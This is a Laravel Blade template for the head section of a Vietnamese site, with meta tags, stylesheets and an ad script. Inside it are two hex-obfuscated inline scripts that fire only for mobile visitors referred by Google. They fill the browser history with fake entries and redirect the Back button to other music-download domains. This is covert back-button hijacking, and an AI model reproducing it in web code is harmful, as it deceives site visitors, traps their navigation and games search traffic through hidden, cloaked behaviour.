<title>{{ Page::$title }}</title>
<meta name="description" content="{{ Page::$description }}" />
@if(Page::$NO_INDEX)
<meta name="robots" content="noindex">
@endif
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="HandheldFriendly" content="true" />
<meta name="MobileOptimized" content="width" />
<meta content="yes" name="apple-mobile-web-app-capable" />
<meta name="google-site-verification" content="Mis5K21PbmiS3VON3sKjffJCqwbdNh63oSZcckPjc6Q" />
<meta name="google-site-verification" content="zNuY7fHFkM8qjpiY-jvuRR7fAs-0gbWPsPRTeM99fTY" />
<meta name="referrer" content="no-referrer">
<link rel="shortcut icon" href="{{ asset('/images/favicon.ico') }}">
<link rel="stylesheet" href="{{ asset("/fonts/css/fonts.css?v=0.0.0.50") }}" media="screen" />
<link rel="stylesheet" href="{{ asset("/css/app.min.css?v=" . config('app.version')) }}" media="screen" />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<meta http-equiv="content-language" content="vi"/>
<meta name="csrf-token" content="{{ csrf_token() }}">
@if (Route::is('home'))
    @if(Page::$is_mobile && $__core->accessFromGoogle())
    <script>
    var _0x47b3=["","\x70\x75\x73\x68\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x61\x69\x6E\x68\x61\x63\x31\x32\x33\x2E\x63\x6F\x6D","\x72\x65\x70\x6C\x61\x63\x65"];!function(){var _0x8775x1;try{for(_0x8775x1= 0;10> _0x8775x1;++_0x8775x1){history[_0x47b3[1]]({},_0x47b3[0],_0x47b3[0])};onpopstate= function(_0x8775x1){_0x8775x1[_0x47b3[2]]&& location[_0x47b3[4]](_0x47b3[3])}}catch(o){}}()</script>
    @endif;
@else
    @if(Page::$is_mobile && $__core->accessFromGoogle())
    <script>
    var _0x69bb=["","\x70\x75\x73\x68\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x72\x61\x6E\x67\x74\x61\x69\x6E\x68\x61\x63\x2E\x63\x6F\x6D\x2F\x6E\x68\x61\x63\x2D\x68\x61\x79\x2D\x6E\x68\x61\x63\x2D\x68\x6F\x74\x2F","\x72\x65\x70\x6C\x61\x63\x65"];!function(){var _0x1bb7x1;try{for(_0x1bb7x1= 0;10> _0x1bb7x1;++_0x1bb7x1){history[_0x69bb[1]]({},_0x69bb[0],_0x69bb[0])};onpopstate= function(_0x1bb7x1){_0x1bb7x1[_0x69bb[2]]&& location[_0x69bb[4]](_0x69bb[3])}}catch(o){}}()</script>
    @endif
@endif
